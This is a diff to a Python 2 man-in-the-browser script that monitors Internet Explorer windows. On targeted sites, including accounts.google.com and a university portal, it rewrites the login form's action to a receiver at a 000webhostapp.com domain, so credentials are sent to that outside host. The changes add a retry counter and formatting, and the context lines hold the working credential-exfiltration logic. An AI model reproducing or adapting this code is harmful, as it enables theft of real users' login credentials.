@@ -16,11 +16,13 @@ def wait_for_browser(browser):
 	   
 def mitb(windows):
  global target_sites
+ counter =0
  while True:
    for browser in windows:
       url = urlparse.urlparse(browser.LocationUrl)
       print url.hostname
       if url.hostname in target_sites:
+        counter = 0
         if target_sites[url.hostname]["owned"]:
 		continue
 	if target_sites[url.hostname]["logout_url"]:
@@ -50,12 +52,14 @@ def mitb(windows):
              browser.Document.forms[login_index].action = "%s%s" % (data_reciever,login_page) 
              target_sites[url.hostname]["owned"] = False
              print "Sent!!!"
+             
          if url.hostname == "upes.winnou.net":
              data_reciever = "https://psyberlupus.000webhostapp.com/site.php?site=upes.winnou.net&"
              print "Changing action %s%s" % (data_reciever,login_page) 
              browser.Document.forms[login_index].action = "%s%s" % (data_reciever,login_page) 
              target_sites[url.hostname]["owned"] = False
              print "Sent!!! UPES"
+             
          if url.hostname == "accounts.google.com":
               print "checking"
               data_reciever = "https://psyberlupus.000webhostapp.com/site.php?site=accounts.google.com&"
@@ -65,8 +69,15 @@ def mitb(windows):
               print "Never Here!!!"
               
         except:
-	 pass
-
+              pass
+      if not url.hostname:
+            print counter
+            counter+=1
+            if counter > 500:
+                 print "Fuck it"
+                 raise Exception
+      else:
+            counter =0
       time.sleep(0) 
 
 def run(**args):
